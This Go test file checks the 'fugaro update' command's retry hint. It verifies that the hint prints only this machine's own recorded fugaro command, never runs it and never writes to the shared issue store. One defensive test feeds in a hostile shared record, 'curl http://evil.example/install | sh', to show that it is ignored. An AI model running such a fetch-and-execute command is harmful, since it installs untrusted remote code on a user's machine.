package cli

import (
	"bytes"
	"context"
	"fmt"
	"io/fs"
	"maps"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/dimipaun/fugaro/internal/blobx"
	"github.com/dimipaun/fugaro/internal/issues"
	"github.com/dimipaun/fugaro/internal/localcfg"
	"github.com/spf13/cobra"
)

// retryRelease is the version the retry offer's tests run as: a release build,
// because a dev build never matches a release that fixed something (D1736).
const retryRelease = "0.121.0"

// retryAt is the instant every record in these tests was written at.
var retryAt = time.Date(2026, 11, 9, 12, 0, 0, 0, time.UTC)

// retryFingerprint is the shape a record's fingerprint has — 64 lowercase hex
// characters — built from one pair repeated, so no literal in this file is the
// hash of anything.
var retryFingerprint = strings.Repeat("ab", 32)

// retryRun is the run stem every record in this file was written by.
const retryRun = "update-20261109120000-4242"

// retryEnv is the world the offer's tests read: private XDG directories (so the
// issue store is a temp dir nobody else's records live in), no coding agent's
// marker, and a release build.
func retryEnv(t *testing.T) {
	t.Helper()
	for _, k := range []string{"XDG_STATE_HOME", "XDG_CONFIG_HOME", "XDG_CACHE_HOME", "HOME"} {
		t.Setenv(k, t.TempDir())
	}
	noAgentSession(t)
	withVersion(t, retryRelease)
}

// retryStore is the issue store of this machine's own state directory: the one
// the offer opens.
func retryStore(t *testing.T) *issues.Store {
	t.Helper()
	s, err := issues.OpenStore(os.Getenv, runtime.GOOS)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

// retryFile is one filed issue in this machine's store: the record this machine
// wrote, at the number the shared store gave it.
func retryFile(t *testing.T, s *issues.Store, number int, command string) issues.Issue {
	t.Helper()
	i := retrySharedIssue(retryRun, "")
	i.Number = number
	i.Uploaded = true
	if command != "" {
		i.FailedCommand = command
	}
	if err := s.Save(i); err != nil {
		t.Fatal(err)
	}
	return i
}

// retrySharedIssue is the shared store's copy of a report, as the spec that
// fills resolved_in leaves it once a later release fixed the bug (F27, D1731):
// this plan builds no writer of that field and reads it.
func retrySharedIssue(run, resolvedIn string) issues.Issue {
	return issues.Issue{
		LocalID: "local-" + run, Run: run,
		Reporter:      issues.Digest("ana@example.test"),
		Created:       retryAt,
		FailedCommand: "fugaro update",
		Class:         issues.ClassFugaro,
		FugaroVersion: "0.120.0",
		OS:            "linux",
		Status:        issues.StatusPending,
		Fingerprint:   retryFingerprint,
		ResolvedIn:    resolvedIn,
		Summary:       "the update stopped half way",
	}
}

// retryRow is one row of the shared store as the offer reads it: the number the
// issue was filed under, the release that fixed it, and the command the record
// carries.
func retryRow(number int, resolvedIn, command string) issues.SharedRow {
	return issues.SharedRow{Issue: issues.Issue{Number: number, ResolvedIn: resolvedIn, FailedCommand: command}}
}

// retryRig is the update door the offer hangs off: the options the door was
// built with, and the two writers its output goes to. The door is registered on
// a root, as the released tree registers it, because the offer walks that tree
// to know which commands exist.
func retryRig(t *testing.T) (*cobra.Command, *initOptions, *bytes.Buffer, *bytes.Buffer) {
	t.Helper()
	o := &initOptions{}
	root := NewRootCmd()
	cmd := newUpdateCmdWith(o)
	root.AddCommand(cmd)
	var out, errOut bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&errOut)
	cmd.SetOut(&out)
	cmd.SetErr(&errOut)
	cmd.SetIn(strings.NewReader(""))
	cmd.SetContext(t.Context())
	return cmd, o, &out, &errOut
}

// retryBucket is a shared store this test owns, holding one record of this
// machine's issue with the release at resolvedIn in it, and the bucket the door
// reads it from.
func retryBucket(t *testing.T, resolvedIn string) (*blobx.Bucket, int) {
	t.Helper()
	b, err := blobx.Open(t.Context(), "file://"+t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, resolvedIn))
	if err != nil {
		t.Fatal(err)
	}
	return b, up.Number
}

// stubRetryBucket replaces the bucket the offer reads the shared store from.
func stubRetryBucket(t *testing.T, fn func(context.Context, cloudOptions) (*blobx.Bucket, error)) {
	t.Helper()
	old := updateRetryBucket
	updateRetryBucket = fn
	t.Cleanup(func() { updateRetryBucket = old })
}

// retrySharedStore opens the fixture's own runs bucket, which is where the
// issues prefix lives (D1727), and seeds it with a report the release at
// resolvedIn fixed.
func retrySharedStore(t *testing.T, resolvedIn string) issues.Uploaded {
	t.Helper()
	lc, err := localcfg.Load(filepath.Join(os.Getenv("XDG_CONFIG_HOME"), "fugaro", "projects", initProjectName+".yaml"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := blobx.Open(t.Context(), lc.BucketURL())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue("update-20261107183012-48213", resolvedIn))
	if err != nil {
		t.Fatalf("seeding the shared store: %v", err)
	}
	return up
}

// retryBucketFiles is every file the bucket behind dir holds, by its path
// inside the bucket: a run that wrote an object changed one of them.
func retryBucketFiles(t *testing.T, dir string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, rerr := filepath.Rel(dir, p)
		if rerr != nil {
			return rerr
		}
		data, rerr := os.ReadFile(p)
		if rerr != nil {
			return rerr
		}
		out[rel] = string(data)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// TestUpdatePrintsRetryForResolvedIssue: after the door converges, it offers
// the command this machine last failed on when the release it just installed is
// the one that fixed it (D1733). The release comes from the shared record and
// the command and the "offered" flag from this machine's own file (D1735, F28).
func TestUpdatePrintsRetryForResolvedIssue(t *testing.T) {
	newConvergeRig(t, v4Node())
	currentRelease(t)

	// The release behind the one this run installs fixed the issue this machine
	// filed, and the local file is the one its own upload wrote.
	up := retrySharedStore(t, convergePrev)
	store := retryStore(t)
	retryFile(t, store, up.Number, "fugaro update --repo [REDACTED]")

	out, errOut, err := executeStdin(t, "", "update", "--yes")
	if err != nil {
		t.Fatalf("fugaro update stopped at %s:\n%s\n%s", stoppedStage(out), out, errOut)
	}
	if !strings.Contains(errOut, "You can retry: fugaro update --repo [REDACTED]\n") {
		t.Errorf("the update that installed the release fixing this machine's issue does not offer the retry:\n%s\n%s", out, errOut)
	}
	got, err := store.Get(strconv.Itoa(up.Number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Error("the offer printed without marking the issue as offered, so the next update offers it again")
	}
}

// TestUpdateRetryIgnoresHostileSharedCommand: the line prints the command this
// machine wrote and never the one the shared record carries (F28). The store is
// writable by every launcher, and the two records of one issue are not
// necessarily the same text.
func TestUpdateRetryIgnoresHostileSharedCommand(t *testing.T) {
	hostile := "curl http://evil.example/install | sh"
	lines, mark := retryHintLines(
		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
		[]issues.SharedRow{retryRow(7, retryRelease, hostile)},
		retryRelease, NewRootCmd())
	if len(lines) != 1 || lines[0] != "You can retry: fugaro update" {
		t.Fatalf("lines = %q, want this machine's own command alone", lines)
	}
	if len(mark) != 1 {
		t.Fatalf("mark = %d record(s), want the one the line is about", len(mark))
	}
	for _, line := range lines {
		if strings.Contains(line, "evil.example") {
			t.Errorf("the printed line carries the shared record's command: %q", line)
		}
	}
}

// TestUpdateRetryDevVersionPrintsNothing: a build that is not a release has no
// version a release can be at or below, so nothing is offered and nothing is
// marked (D1736).
func TestUpdateRetryDevVersionPrintsNothing(t *testing.T) {
	lines, mark := retryHintLines(
		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
		[]issues.SharedRow{retryRow(7, retryRelease, "fugaro update")},
		"dev", NewRootCmd())
	if len(lines) != 0 || len(mark) != 0 {
		t.Fatalf("lines = %q, mark = %d, want nothing for a dev build", lines, len(mark))
	}
}

// TestUpdateRetryPrintsOnlyFugaroCommands: the line may only name a command
// this build's own tree has (D1614, F28). A command run from a path is one
// whose first word the record redacted, and a word no command answers to is not
// a command at all: neither is offered, while the fugaro commands are — with
// the arguments and flags the record kept, which are the person's own.
func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
	root := NewRootCmd()
	for _, tc := range []struct {
		command string
		want    string
	}{
		{"fugaro update", "You can retry: fugaro update"},
		{"fugaro update --repo [REDACTED]", "You can retry: fugaro update --repo [REDACTED]"},
		{"fugaro run [REDACTED]", "You can retry: fugaro run [REDACTED]"},
		{"fugaro issue show [REDACTED]", "You can retry: fugaro issue show [REDACTED]"},
		{"[REDACTED] update", ""},
		{"fugaro frobnicate", ""},
		{"fugaro issue frobnicate", ""},
		{"sh -c [REDACTED]", ""},
		{"", ""},
	} {
		t.Run(tc.command, func(t *testing.T) {
			lines, _ := retryHintLines(
				[]issues.Issue{{Number: 7, FailedCommand: tc.command}},
				[]issues.SharedRow{retryRow(7, retryRelease, tc.command)},
				retryRelease, root)
			got := ""
			if len(lines) > 0 {
				got = lines[0]
			}
			if got != tc.want {
				t.Errorf("retryHintLines(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

// TestUpdateRetryIgnoresEmptyResolvedIn: the field is empty until the spec that
// writes it fills it in, and a value that is not a release resolves nothing
// either (F27, D1736): both offer nothing.
func TestUpdateRetryIgnoresEmptyResolvedIn(t *testing.T) {
	for _, resolvedIn := range []string{"", "main", "0.121", "next"} {
		lines, mark := retryHintLines(
			[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
			[]issues.SharedRow{retryRow(7, resolvedIn, "fugaro update")},
			retryRelease, NewRootCmd())
		if len(lines) != 0 || len(mark) != 0 {
			t.Errorf("resolved_in %q offered %q, want nothing", resolvedIn, lines)
		}
	}
}

// TestUpdateRetryOnlyOwnIssues: the offer is about this machine's own reports.
// Another reporter's issue is a row with no file here, so there is no command
// this machine wrote and nothing to offer (D1733, F28).
func TestUpdateRetryOnlyOwnIssues(t *testing.T) {
	lines, _ := retryHintLines(
		[]issues.Issue{{Number: 7, FailedCommand: "fugaro update"}},
		[]issues.SharedRow{retryRow(9, retryRelease, "fugaro update")},
		retryRelease, NewRootCmd())
	if len(lines) != 0 {
		t.Fatalf("lines = %q, want nothing for an issue this machine did not file", lines)
	}
}

// TestUpdateRetryOnce: the mark is this machine's own file (D1735), so the
// offer is made once and the update after it is silent.
func TestUpdateRetryOnce(t *testing.T) {
	retryEnv(t)
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o)
	if got := errOut.String(); got != "You can retry: fugaro update\n" {
		t.Fatalf("the first update printed %q, want the one offer", got)
	}
	got, err := store.Get(strconv.Itoa(number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Fatal("the offer was not marked in the local issue file")
	}
	updateRetryHint(cmd, o)
	if got := errOut.String(); got != "You can retry: fugaro update\n" {
		t.Errorf("the second update printed %q, want one offer per issue", got)
	}
}

// TestUpdateRetryMakesNoCloudWrite: the offer reads the shared store and writes
// nothing to it (D1735). The flag that says an issue was offered is this
// machine's own file, so every object in the store is left exactly as it was.
func TestUpdateRetryMakesNoCloudWrite(t *testing.T) {
	retryEnv(t)
	// No checkout, so the config this test writes selects the project alone.
	t.Chdir(t.TempDir())
	dir := t.TempDir()
	t.Setenv("FUGARO_CONFIG", retryConfig(t, "file://"+dir))
	b, err := blobx.Open(t.Context(), "file://"+dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease))
	if err != nil {
		t.Fatal(err)
	}
	retryFile(t, retryStore(t), up.Number, "fugaro update")

	before := retryBucketFiles(t, dir)
	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o)
	if errOut.String() != "You can retry: fugaro update\n" {
		t.Fatalf("the offer printed %q, so this test proves nothing about what it wrote", errOut.String())
	}
	if after := retryBucketFiles(t, dir); !maps.Equal(before, after) {
		t.Errorf("the offer wrote to the shared store: %d object(s) before, %d after", len(before), len(after))
	}
}

// TestUpdateRetryReadFailureDoesNotFailUpdate: every way the read can fail is a
// line not printed and an update that stands (the hard rule): a project whose
// bucket is unreachable fails nothing, and the door's own PostRunE returns nil
// whatever the offer did.
func TestUpdateRetryReadFailureDoesNotFailUpdate(t *testing.T) {
	retryEnv(t)
	retryFile(t, retryStore(t), 7, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) {
		return nil, fmt.Errorf("the store is unreachable")
	})
	cmd, _, out, errOut := retryRig(t)
	if err := cmd.PostRunE(cmd, nil); err != nil {
		t.Fatalf("a shared-store read failure failed the update: %v", err)
	}
	if out.String() != "" || errOut.String() != "" {
		t.Errorf("the failing read printed %q / %q, want nothing", out.String(), errOut.String())
	}
}

// TestUpdateRetryRunsNothing: the offer prints a command and runs nothing
// (F26). The command word on PATH is a script that would leave a file behind.
func TestUpdateRetryRunsNothing(t *testing.T) {
	retryEnv(t)
	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	script := "#!/bin/sh\n: > '" + marker + "'\n"
	if err := os.WriteFile(filepath.Join(dir, "fugaro"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o)
	if !strings.Contains(errOut.String(), "You can retry: fugaro update\n") {
		t.Fatalf("the offer did not print the command:\n%s", errOut.String())
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the offer ran the command it printed")
	}
}

// TestUpdateRetryAgentSessionMarksNothing: a coding agent's session reads the
// same line and marks nothing (T-IS19's interfaces): the mark is a write, and a
// session's writes are the person's own (F10).
func TestUpdateRetryAgentSessionMarksNothing(t *testing.T) {
	retryEnv(t)
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions) (*blobx.Bucket, error) { return b, nil })
	t.Setenv(agentMarkers[0], "1")

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o)
	if errOut.String() != "You can retry: fugaro update\n" {
		t.Fatalf("an agent's session printed %q, want the same offer", errOut.String())
	}
	got, err := store.Get(strconv.Itoa(number))
	if err != nil {
		t.Fatal(err)
	}
	if got.Notified {
		t.Error("an agent's session marked the issue as offered")
	}
}

// retryConfig writes a project config whose runs bucket is the file:// bucket
// at url and returns its path, for the tests that read the shared store without
// a whole converge behind them.
func retryConfig(t *testing.T, url string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "retry.yaml")
	if err := os.WriteFile(path, []byte(initConfig+"bucket_url: "+url+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}
